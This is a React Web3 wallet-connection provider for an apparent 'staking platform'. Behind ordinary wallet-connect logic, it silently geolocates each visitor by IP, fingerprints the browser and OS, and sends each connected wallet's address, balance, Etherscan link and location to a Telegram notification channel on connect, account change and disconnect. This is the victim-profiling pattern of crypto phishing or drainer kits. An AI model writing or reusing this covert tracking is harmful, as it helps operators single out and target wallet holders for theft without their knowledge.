"use client"

import { createContext, useContext, useState, useEffect, type ReactNode, useRef } from "react"
import { trackWalletConnection } from "@/lib/telegram-service"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"

declare global {
  interface Window {
    ethereum?: any
    ethers?: any
    phantom?: any
    solana?: any
  }
}

// WalletConnect project ID
const WALLET_CONNECT_PROJECT_ID = "2fc330b1a9aa1b7c859bd84210853433"

const WALLET_OPTIONS = [
  { name: "MetaMask", color: "#F6851B", icon: "/images/wallets/metamask-new.png" },
  { name: "Browser", color: "#4285F4", icon: "/images/wallets/browser.png" },
  { name: "Binance Web3 Wallet", color: "#F0B90B", icon: "/images/wallets/binance.png" },
  { name: "OKX Wallet", color: "#000000", icon: "/images/wallets/okx.png" },
  { name: "Coinbase Wallet", color: "#0052FF", icon: "/images/wallets/coinbase.png" },
  {
    name: "WalletConnect",
    color: "#3B99FC",
    icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMDAgMTg1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGZpbGxSdWxlPSJldmVub2RkIiBjbGlwUnVsZT0iZXZlbm9kZCIgZD0iTTYwLjEwMiAzMC4yMjZDMTA0LjA5NiAtMTAuMDc1MyAxNzUuOTA0IC0xMC4wNzUzIDIxOS44OTggMzAuMjI2TDIyNi4zMDcgMzYuMDE3QzIyOC4yNzUgMzcuODM2NCAyMjguMjc1IDQwLjk1OTYgMjI2LjMwNyA0Mi43NzlMMTk3Ljc2IDY5LjAxMzNDMTk2Ljc3NiA3MC40MjMyIDE5NC45MjYgNzAuNDIzMiAxOTMuOTQyIDY5LjAxMzNMMTg0LjczNSA2MC41NTMyQzE1NC40ODkgMzIuNzcyNiAxMjUuNTExIDMyLjc3MjYgOTUuMjY0OSA2MC41NTMyTDg1LjMwNjcgNjkuNzM2OUM4NC4zMjI3IDcxLjE0NjggODIuNDcyNyA3MS4xNDY4IDgxLjQ4ODcgNjkuNzM2OUw1Mi45NDE2IDQzLjUwMjZDNTAuOTczNiA0MS42ODMyIDUwLjk3MzYgMzguNTYgNTIuOTQxNiAzNi43NDA2TDYwLjEwMiAzMC4yMjZaTTI0Mi4zNDIgNTEuMzQ2NkwyNjcuOTUxIDc0Ljk4NjZDMjY5LjkxOSA3Ni44MDYgMjY5LjkxOSA3OS45MjkyIDI2Ny45NTEgODEuNzQ4NkwyMDAuMjkzIDE0NC4wMTVDMTk4LjMyNSAxNDUuODM0IDE5NS4zNzcgMTQ1LjgzNCAxOTMuNDA5IDE0NC4wMTVDMTkzLjQwOSAxNDQuMDE1IDE5My40MDkgMTQ0LjAxNSAxOTMuNDA5IDE0NC4wMTVMMTQzLjU2MiA5OC4wNTc0QzE0My4wNyA5Ny4zNTI0IDE0Mi4xNDUgOTcuMzUyNCAxNDEuNjUzIDk4LjA1NzRDMTQxLjY1MyA5OC4wNTc0IDE0MS42NTMgOTguMDU3NCAxNDEuNjUzIDk4LjA1NzRMMTAxLjg5MSAxNDQuMDE1Qzk5LjkyMyAxNDUuODM0IDk2Ljk3NSAxNDUuODM0IDk1LjAwNyAxNDQuMDE1Qzk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1TDI3LjM0OTEgODEuNzQ4NkMyNS4zODExIDc5LjkyOTIgMjUuMzgxMSA3Ni44MDYgMjcuMzQ5MSA3NC45ODY2TDUyLjk1ODEgNTEuMzQ2NkM1NC45MjYxIDQ5LjUyNzIgNTcuODc0MSA0OS41MjcyIDU5Ljg0MjEgNTEuMzQ2NkwxMDkuNjg5IDk3LjMwNDJDMTEwLjE4MSA5OC4wMDkyIDExMS4xMDYgOTguMDA5MiAxMTEuNTk4IDk3LjMwNDJDMTExLjU5OCA5Ny4zMDQyIDExMS41OTggOTcuMzA0MiAxMTEuNTk4IDk3LjMwNDJMMTUxLjM2IDUxLjM0NjZDMTUzLjMyOCA0OS41MjcyIDE1Ni4yNzYgNDkuNTI3MiAxNTguMjQ0IDUxLjM0NjZDMTU4LjI0NCA1MS4zNDY2IDE1OC4yNDQgNTEuMzQ2NiAxNTguMjQ0IDUxLjM0NjZMMjA4LjA5MSA5Ny4zMDQyQzIwOC41ODMgOTguMDA5MiAyMDkuNTA4IDk4LjAwOTIgMjEwIDk3LjMwNDJDMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDJMMjU5Ljg0NyA1MS4zNDY2QzI2MS44MTUgNDkuNTI3MiAyNjQuNzYzIDQ5LjUyNzIgMjY2LjczMSA1MS4zNDY2TDI0Mi4zNDIgNTEuMzQ2NloiIGZpbGw9IiMzQjk5RkMiLz48L3N2Zz4K",
  },
]

const OTHER_WALLET_OPTIONS = [
  { name: "Trust Wallet", color: "#3375BB", icon: "/images/wallets/trustwallet.png" },
  { name: "Rainbow", color: "#001E59", icon: "/images/wallets/rainbow.png" },
  { name: "Argent", color: "#FF875B", icon: "/images/wallets/argent.png" },
  { name: "imToken", color: "#11C4D1", icon: "/images/wallets/imtoken.png" },
  { name: "Exodus", color: "#1B1B1B", icon: "/images/wallets/exodus-new.png" },
  { name: "Crypto.com", color: "#002D74", icon: "/images/wallets/crypto-com.png" },
  { name: "TokenPocket", color: "#2980FE", icon: "/images/wallets/tokenpocket.png" },
  { name: "Ledger", color: "#000000", icon: "/images/wallets/ledger.png" },
]

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  selectNewWallet: () => void
  refreshBalance: () => Promise<number>
  tokenBalances: Record<string, string>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  selectNewWallet: () => {},
  refreshBalance: async () => 0,
  tokenBalances: {},
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [userIP, setUserIP] = useState<string | null>(null)
  const [userLocation, setUserLocation] = useState<{ country?: string; city?: string } | null>(null)
  const [userBrowser, setUserBrowser] = useState<string>("Unknown")
  const [userOS, setUserOS] = useState<string>("Unknown")
  const [referrer, setReferrer] = useState<string>("Direct")
  const [isMobile, setIsMobile] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [activeProvider, setActiveProvider] = useState<any>(null)
  const [hasDisconnected, setHasDisconnected] = useState(false)
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
  const [isSelectingNewWallet, setIsSelectingNewWallet] = useState(false)

  // Add refs to track notification status
  const notificationSentRef = useRef<Record<string, boolean>>({})
  const disconnectNotificationSentRef = useRef(false)

  // Check if we're on mobile
  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      return /android|iPad|iPhone|iPod/i.test(userAgent) && !/Windows Phone/i.test(userAgent)
    }
    setIsMobile(checkMobile())
  }, [])

  // Set up basic user info
  useEffect(() => {
    const storedReferrer = localStorage.getItem("referrer")
    if (storedReferrer) {
      setReferrer(storedReferrer)
    } else if (document.referrer) {
      setReferrer(document.referrer)
    }

    if (typeof navigator !== "undefined") {
      const userAgent = navigator.userAgent

      if (userAgent.indexOf("Chrome") > -1) setUserBrowser("Chrome")
      else if (userAgent.indexOf("Safari") > -1) setUserBrowser("Safari")
      else if (userAgent.indexOf("Firefox") > -1) setUserBrowser("Firefox")
      else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) setUserBrowser("Internet Explorer")
      else if (userAgent.indexOf("Edge") > -1) setUserBrowser("Edge")
      else if (userAgent.indexOf("Opera") > -1) setUserBrowser("Opera")

      if (userAgent.indexOf("Win") > -1) setUserOS("Windows")
      else if (userAgent.indexOf("Mac") > -1) setUserOS("MacOS")
      else if (userAgent.indexOf("Linux") > -1) setUserOS("Linux")
      else if (userAgent.indexOf("Android") > -1) setUserOS("Android")
      else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1 || userAgent.indexOf("iPod") > -1)
        setUserOS("iOS")
    }

    // Get user IP and location
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        if (data.ip) {
          setUserIP(data.ip)
          return fetch(`https://ipapi.co/${data.ip}/json/`)
        }
        return fetch("https://ipapi.co/json/")
      })
      .then((res) => res.json())
      .then((data) => {
        setUserLocation({
          country: data.country_name,
          city: data.city,
        })
      })
      .catch((err) => {
        console.error("Failed to get IP or location:", err)
      })
  }, [])

  // Detect available wallet providers
  const detectWalletProviders = () => {
    if (typeof window === "undefined") return []

    const providers: any[] = []

    // Check for window.ethereum (injected provider)
    if (window.ethereum) {
      // Check if it's an array of providers (like with MetaMask + other wallets)
      if (window.ethereum.providers) {
        window.ethereum.providers.forEach((provider: any) => {
          providers.push(provider)
        })
      } else {
        // Single provider
        providers.push(window.ethereum)
      }
    }

    return providers
  }

  // Get wallet type from provider
  const getWalletTypeFromProvider = (provider: any): string => {
    if (!provider) return "Unknown"

    if (provider.isMetaMask) return "MetaMask"
    if (provider.isCoinbaseWallet) return "Coinbase Wallet"
    if (provider.isExodus) return "Exodus"
    if (provider.isTrust) return "Trust Wallet"
    if (provider.isOkxWallet) return "OKX Wallet"
    if (provider.isBinance) return "Binance Web3 Wallet"
    if (provider.isWalletConnect) return "WalletConnect"
    if (provider.isRainbow) return "Rainbow"
    if (provider.isArgent) return "Argent"
    if (provider.isImToken) return "imToken"
    if (provider.isCrypto) return "Crypto.com"
    if (provider.isTokenPocket) return "TokenPocket"

    return "Browser"
  }

  // Auto-connect on initial load
  useEffect(() => {
    const autoConnect = async () => {
      // If user has explicitly disconnected in this session, don't auto-connect
      if (hasDisconnected) {
        return
      }

      const savedAddress = localStorage.getItem("walletAddress")
      const savedWalletType = localStorage.getItem("walletType")

      // First check if we have any active connections in any provider
      const providers = detectWalletProviders()

      // Try to find any already connected account in any provider first
      for (const provider of providers) {
        try {
          const accounts = await provider.request({ method: "eth_accounts" })

          if (accounts && accounts.length > 0) {
            const connectedAddress = accounts[0]
            const detectedWalletType = getWalletTypeFromProvider(provider)

            console.log(`Found connected account: ${connectedAddress} in wallet: ${detectedWalletType}`)

            // Set up the connection with this provider
            setActiveProvider(provider)
            setAddress(connectedAddress)
            setIsConnected(true)
            setWalletType(detectedWalletType)

            // Update localStorage with this connection
            localStorage.setItem("walletAddress", connectedAddress)
            localStorage.setItem("walletType", detectedWalletType)

            // Get balance
            try {
              const balanceHex = await provider.request({
                method: "eth_getBalance",
                params: [connectedAddress, "latest"],
              })

              const balanceWei = BigInt(balanceHex)
              const balanceEth = Number(balanceWei) / 1e18
              setBalance(balanceEth.toFixed(6))

              // Fetch token balances
              await fetchTokenBalances(connectedAddress)

              // Send notification about the connection - only if we haven't sent one for this address
              if (!notificationSentRef.current[connectedAddress]) {
                await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
                notificationSentRef.current[connectedAddress] = true
              }
            } catch (balanceError) {
              console.error("Error getting balance:", balanceError)
            }

            // We found an active connection, no need to check others
            return
          }
        } catch (error) {
          console.warn("Error checking provider:", error)
        }
      }

      // If we didn't find any active connections but have a saved address,
      // try to reconnect using the saved information
      if (savedAddress && savedWalletType) {
        console.log(`Trying to reconnect to saved wallet: ${savedWalletType} with address: ${savedAddress}`)

        for (const provider of providers) {
          try {
            const detectedWalletType = getWalletTypeFromProvider(provider)

            // If this provider matches our saved wallet type, try to use it
            if (
              detectedWalletType === savedWalletType ||
              (detectedWalletType === "Browser" && savedWalletType === "Browser")
            ) {
              // Try to get accounts from this provider
              const accounts = await provider.request({ method: "eth_accounts" })

              if (accounts && accounts.length > 0) {
                const connectedAddress = accounts[0]

                // Set up the connection with this provider
                setActiveProvider(provider)
                setAddress(connectedAddress)
                setIsConnected(true)
                setWalletType(detectedWalletType)

                // Get balance
                try {
                  const balanceHex = await provider.request({
                    method: "eth_getBalance",
                    params: [connectedAddress, "latest"],
                  })

                  const balanceWei = BigInt(balanceHex)
                  const balanceEth = Number(balanceWei) / 1e18
                  setBalance(balanceEth.toFixed(6))

                  // Fetch token balances
                  await fetchTokenBalances(connectedAddress)

                  // Send notification about the connection - only if we haven't sent one for this address
                  if (!notificationSentRef.current[connectedAddress]) {
                    await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
                    notificationSentRef.current[connectedAddress] = true
                  }
                } catch (balanceError) {
                  console.error("Error getting balance:", balanceError)
                }

                // We found a matching provider, no need to check others
                return
              }
            }
          } catch (error) {
            console.warn("Error checking provider:", error)
          }
        }
      }

      // If we get here, we didn't find any active connections or matching saved providers
      localStorage.removeItem("walletAddress")
      localStorage.removeItem("walletType")
    }

    autoConnect()
  }, [hasDisconnected])

  // Listen for account changes
  useEffect(() => {
    if (!activeProvider) return

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect()
      } else if (accounts[0] !== address) {
        setAddress(accounts[0])
        localStorage.setItem("walletAddress", accounts[0])
        refreshBalance()
        fetchTokenBalances(accounts[0])

        // Send notification about the account change - only if we haven't sent one for this address
        if (!notificationSentRef.current[accounts[0]]) {
          sendWalletConnectedNotification(accounts[0], walletType, balance)
          notificationSentRef.current[accounts[0]] = true
        }
      }
    }

    activeProvider.on("accountsChanged", handleAccountsChanged)

    return () => {
      activeProvider.removeListener("accountsChanged", handleAccountsChanged)
    }
  }, [activeProvider, address, walletType, balance])

  // Listen for chain changes
  useEffect(() => {
    if (!activeProvider) return

    const handleChainChanged = (chainId: string) => {
      console.log("Chain changed to:", chainId)
      // Refresh the page when the chain changes
      if (typeof window !== "undefined") {
        window.location.reload()
      }
    }

    activeProvider.on("chainChanged", handleChainChanged)

    return () => {
      activeProvider.removeListener("chainChanged", handleChainChanged)
    }
  }, [activeProvider])

  // Initialize WalletConnect
  const initializeWalletConnect = async () => {
    try {
      // Dynamically import WalletConnect
      const { EthereumProvider } = await import("@walletconnect/ethereum-provider")

      // Initialize the provider
      const provider = await EthereumProvider.init({
        projectId: WALLET_CONNECT_PROJECT_ID,
        chains: [1], // Ethereum mainnet
        optionalChains: [137, 42161], // Polygon, Arbitrum
        showQrModal: true,
        qrModalOptions: {
          themeMode: "dark",
        },
        metadata: {
          name: "Staking Platform",
          description: "Modern Ethereum Staking Platform",
          url: window.location.origin,
          icons: [`${window.location.origin}/logo.png`],
        },
      })

      // Subscribe to events
      provider.on("connect", (e: any) => {
        console.log("WalletConnect connected!", e)
        if (provider.accounts && provider.accounts.length > 0) {
          const userAddress = provider.accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          setActiveProvider(provider)
          setWalletType("WalletConnect")
          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("wallet_connected_time", Date.now().toString())
          localStorage.setItem("walletType", "WalletConnect")
          refreshBalanceWithProvider(provider, userAddress)
          fetchTokenBalances(userAddress)

          // Send notification about the connection - only if we haven't sent one for this address
          if (!notificationSentRef.current[userAddress]) {
            sendWalletConnectedNotification(userAddress, "WalletConnect", balance)
            notificationSentRef.current[userAddress] = true
          }
        }
      })

      provider.on("disconnect", () => {
        console.log("WalletConnect disconnected!")
        disconnect()
      })

      // Connect
      await provider.connect()

      return true
    } catch (error) {
      console.error("Failed to initialize WalletConnect:", error)
      return false
    }
  }

  // Modify the connect function to handle wallet selection better
  const connect = async () => {
    if (isConnecting) return false
    setIsConnecting(true)

    try {
      // If user is explicitly selecting a new wallet, always show the wallet selection modal
      if (isSelectingNewWallet) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      // First check if we're already connected to a wallet
      if (isConnected && address) {
        console.log("Already connected to wallet:", address)
        setIsConnecting(false)
        return true
      }

      // If user has disconnected in this session, show the wallet selection modal
      if (hasDisconnected) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      // Check if there's an active wallet connection we can use directly
      const providers = detectWalletProviders()

      // If no providers found, show wallet selection modal
      if (providers.length === 0) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      // Try to connect to the first available provider
      for (const provider of providers) {
        try {
          const accounts = await provider.request({ method: "eth_requestAccounts" })
          if (accounts && accounts.length > 0) {
            const connectedAddress = accounts[0]
            const detectedWalletType = getWalletTypeFromProvider(provider)

            console.log(`Connected to wallet: ${detectedWalletType} with address: ${connectedAddress}`)

            // Set up the connection with this provider
            setActiveProvider(provider)
            setAddress(connectedAddress)
            setIsConnected(true)
            setWalletType(detectedWalletType)

            // Store connection info
            localStorage.setItem("walletAddress", connectedAddress)
            localStorage.setItem("wallet_connected_time", Date.now().toString())
            localStorage.setItem("walletType", detectedWalletType)

            // Get balance
            await refreshBalanceWithProvider(provider, connectedAddress)
            await fetchTokenBalances(connectedAddress)

            // Send notification about the connection - only if we haven't sent one for this address
            if (!notificationSentRef.current[connectedAddress]) {
              await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)
              notificationSentRef.current[connectedAddress] = true
            }

            setIsConnecting(false)
            return true
          }
        } catch (error) {
          console.warn("Error connecting to provider:", error)
          // Continue to next provider or show modal
        }
      }

      // If no provider worked, show the wallet selection modal
      setIsWalletModalOpen(true)
      setIsConnecting(false)
      return false
    } catch (error) {
      console.error("Error in connect function:", error)
      setIsConnecting(false)
      return false
    }
  }

  // Add a function to explicitly select a new wallet
  const selectNewWallet = () => {
    setIsSelectingNewWallet(true)
    disconnectWallet().then(() => {
      setIsWalletModalOpen(true)
    })
  }

  // Fetch token balances
  const fetchTokenBalances = async (userAddress: string) => {
    try {
      // For now, we'll just set ETH balance
      setTokenBalances({
        ETH: balance,
      })
    } catch (error) {
      console.error("Error fetching token balances:", error)
      setTokenBalances({ ETH: balance })
    }
  }

  // Update the handleWalletSelection function to properly handle wallet switching
  const handleWalletSelection = async (walletName: string) => {
    setIsConnecting(true)
    setIsWalletModalOpen(false)
    setIsSelectingNewWallet(false) // Reset the selection flag

    try {
      // Clear any existing connection first
      await disconnectWallet()

      // Special case for WalletConnect
      if (walletName === "WalletConnect") {
        const success = await initializeWalletConnect()
        setIsConnecting(false)
        return success
      }

      // Find the right provider for this wallet
      const providers = detectWalletProviders()
      let targetProvider = null

      // If no providers at all, try WalletConnect as fallback
      if (providers.length === 0) {
        console.log("No Ethereum wallet detected in browser, trying WalletConnect")
        const success = await initializeWalletConnect()
        setIsConnecting(false)
        return success
      }

      for (const provider of providers) {
        const providerWalletType = getWalletTypeFromProvider(provider)

        // If this provider matches the selected wallet type, use it
        if (providerWalletType === walletName) {
          targetProvider = provider
          break
        }

        // For "Browser" wallet, use any provider that's not a specific wallet
        if (walletName === "Browser" && providerWalletType === "Browser") {
          targetProvider = provider
          break
        }
      }

      // If we didn't find a matching provider, use the first available one
      if (!targetProvider) {
        targetProvider = providers[0]
        console.log(`Selected wallet ${walletName} not found, using first available provider`)
      }

      // Use the selected provider
      console.log(`Using provider for ${walletName}`)
      setActiveProvider(targetProvider)
      setWalletType(walletName)

      // Request accounts
      console.log("Requesting accounts...")
      try {
        const accounts = await targetProvider.request({ method: "eth_requestAccounts" })

        if (!accounts || accounts.length === 0) {
          throw new Error("No accounts returned from wallet")
        }

        const userAddress = accounts[0]
        console.log("Account connected:", userAddress)

        // Update state
        setAddress(userAddress)
        setIsConnected(true)
        setHasDisconnected(false) // Reset disconnect flag

        // Store connection info
        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("wallet_connected_time", Date.now().toString())
        localStorage.setItem("walletType", walletName)
        localStorage.removeItem("wallet_disconnected") // Clear disconnected flag

        // Get balance
        const balanceValue = await refreshBalanceWithProvider(targetProvider, userAddress)
        await fetchTokenBalances(userAddress)

        // Send notification - only if we haven't sent one for this address
        if (!notificationSentRef.current[userAddress]) {
          await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))
          notificationSentRef.current[userAddress] = true
        }

        return true
      } catch (error) {
        console.error("Error requesting accounts:", error)
        setIsConnecting(false)
        return false
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)

      try {
        await trackWalletConnection({
          address: "Connection Failed",
          balance: "0",
          walletType: walletName,
          success: false,
          error: error instanceof Error ? error.message : String(error),
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          isMobile,
        })
      } catch (notificationError) {
        console.warn("Failed to send error notification:", notificationError)
      }

      return false
    } finally {
      setIsConnecting(false)
    }
  }

  // Update the disconnectWallet function to properly clean up all connections
  const disconnectWallet = async () => {
    console.log("Disconnecting wallet...")

    // Send notification about disconnection before clearing state - only if we haven't sent one already
    if (address && !disconnectNotificationSentRef.current) {
      try {
        await trackWalletConnection({
          address: address,
          balance: balance,
          walletType: walletType,
          success: false,
          disconnected: true,
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          isMobile,
          etherscanLink: `https://etherscan.io/address/${address}`,
        })
        disconnectNotificationSentRef.current = true
      } catch (error) {
        console.warn("Error sending disconnect notification:", error)
      }
    }

    // Try to disconnect using provider methods if available
    if (activeProvider) {
      try {
        // Some wallets support this method to disconnect
        if (activeProvider.disconnect) {
          await activeProvider.disconnect()
        }

        // For MetaMask and other wallets, we can try to clear permissions
        if (activeProvider.request) {
          try {
            await activeProvider.request({
              method: "wallet_revokePermissions",
              params: [{ eth_accounts: {} }],
            })
          } catch (e) {
            console.warn("Could not revoke wallet permissions:", e)
          }
        }
      } catch (error) {
        console.warn("Error disconnecting from wallet:", error)
      }
    }

    // Clear local state
    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    setWalletType("Unknown")
    setActiveProvider(null)
    setHasDisconnected(true) // Mark that user has explicitly disconnected
    setTokenBalances({})

    // Clear localStorage
    localStorage.removeItem("walletAddress")
    localStorage.removeItem("walletType")
    localStorage.removeItem("wallet_connected_time")

    // Set a flag in localStorage to remember that the user has disconnected
    localStorage.setItem("wallet_disconnected", "true")

    // Reset notification tracking
    notificationSentRef.current = {}
    disconnectNotificationSentRef.current = false

    console.log("Wallet disconnected successfully")
  }

  // Send wallet connected notification
  const sendWalletConnectedNotification = async (userAddress: string, walletName: string, balanceValue: string) => {
    try {
      console.log("Sending wallet connection notification:", userAddress, walletName, balanceValue)

      const tokenHoldings = await getTokenHoldings(userAddress)
      const etherscanLink = `https://etherscan.io/address/${userAddress}`

      // Use the direct API endpoint for more reliable delivery
      const response = await fetch("/api/debug-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: `
🔌 Wallet Connected
👛 Address: <a href="${etherscanLink}">${userAddress}</a>
💰 Balance: ${balanceValue} ETH
🔑 Wallet: ${walletName}
🌐 IP: ${userIP || "Unknown"}
${userLocation?.country ? `📍 Location: ${userLocation.country}${userLocation.city ? `, ${userLocation.city}` : ""}` : ""}
🌐 Browser: ${userBrowser || "Unknown"}
💻 OS: ${userOS || "Unknown"}
📱 Mobile: ${isMobile ? "Yes" : "No"}
⏰ Time: ${new Date().toISOString()}
        `,
        }),
      })

      if (!response.ok) {
        console.error("Failed to send wallet connection notification via API")

        // Fallback to the trackWalletConnection function
        await trackWalletConnection({
          address: userAddress,
          balance: balanceValue,
          walletType: walletName,
          success: true,
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          tokenHoldings,
          isMobile,
          etherscanLink: etherscanLink,
        })
      }
    } catch (notificationError) {
      console.warn("Failed to send connection notification:", notificationError)

      // Fallback to the trackWalletConnection function
      await trackWalletConnection({
        address: userAddress,
        balance: balanceValue,
        walletType: walletName,
        success: true,
        ip: userIP || "Unknown",
        country: userLocation?.country,
        city: userLocation?.city,
        referer: referrer,
        userAgent: navigator.userAgent,
        browser: userBrowser,
        os: userOS,
        tokenHoldings: { ETH: balanceValue },
        isMobile,
        etherscanLink: `https://etherscan.io/address/${userAddress}`,
      }).catch((err) => console.error("Final fallback notification failed:", err))
    }
  }

  // Get token holdings
  const getTokenHoldings = async (address: string) => {
    try {
      return {
        ETH: balance,
      }
    } catch (error) {
      console.error("Error getting token holdings:", error)
      return {}
    }
  }

  // Refresh balance with specific provider
  const refreshBalanceWithProvider = async (provider: any, userAddress: string) => {
    try {
      const balanceHex = await provider.request({
        method: "eth_getBalance",
        params: [userAddress, "latest"],
      })

      const balanceWei = BigInt(balanceHex)
      const balanceEth = Number(balanceWei) / 1e18
      setBalance(balanceEth.toFixed(6))
      return balanceEth
    } catch (error) {
      console.error("Error refreshing balance:", error)
      return 0
    }
  }

  // Refresh balance
  const refreshBalance = async () => {
    if (isConnected && address && activeProvider) {
      return refreshBalanceWithProvider(activeProvider, address)
    }
    return 0
  }

  // Disconnect
  const disconnect = () => {
    disconnectWallet()
  }

  // Check for disconnected flag on initial load
  useEffect(() => {
    const disconnectedFlag = localStorage.getItem("wallet_disconnected")
    if (disconnectedFlag === "true") {
      setHasDisconnected(true)
    }
  }, [])

  // Update the provider value to include the new function
  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        selectNewWallet,
        refreshBalance,
        tokenBalances,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => {
          setIsWalletModalOpen(false)
          setIsSelectingNewWallet(false)
        }}
        walletOptions={WALLET_OPTIONS}
        otherWalletOptions={OTHER_WALLET_OPTIONS}
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
